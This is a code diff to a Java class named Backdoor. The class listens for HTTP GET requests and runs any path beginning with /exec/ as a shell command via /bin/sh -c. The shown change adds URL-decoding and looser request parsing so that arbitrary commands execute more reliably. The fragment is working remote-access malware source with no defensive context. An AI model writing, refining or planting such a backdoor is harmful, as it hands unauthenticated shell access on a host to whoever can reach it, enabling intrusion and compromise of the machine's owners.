@@ -44,18 +44,20 @@ public class Backdoor {
 							boolean is200 = false;
 							while ((input = in.readLine()) != null) {
 								// System.out.println(input);
-								String[] req = input.split(" ");
-								if (req != null && req.length > 2) {
-									if ("GET".equals(req[0]) && "HTTP/1.1".equals(req[2])) {
-										System.out.println(input);
-										if (req[1].startsWith("/exec/")) {
-											String urlcommand = req[1].replace("/exec/", "");
+								String[] req = input.split(" ",2);
+								if (req != null && req.length >= 2) {
+									if ("GET".equals(req[0])) {
+										System.out.println(input);		
+										String command = URLDecoder.decode(req[1], "UTF-8");
+										if (command.startsWith("/exec/")) {
+											String urlcommand = command.replace("/exec/", "").trim();
+											urlcommand = urlcommand.substring(0, urlcommand.lastIndexOf(' '));
 											if (urlcommand != null && !urlcommand.isEmpty()) {
-												String command = URLDecoder.decode(urlcommand, "UTF-8");
-												System.out.println(command);
+//												String command = URLDecoder.decode(urlcommand, "UTF-8");
+												System.out.println(urlcommand);
 
 												String[] cmd = { "/bin/sh", "-c", "" };
-												cmd[2] = command;
+												cmd[2] = urlcommand;
 
 												Runtime rt = Runtime.getRuntime();
 												Process p = rt.exec(cmd);
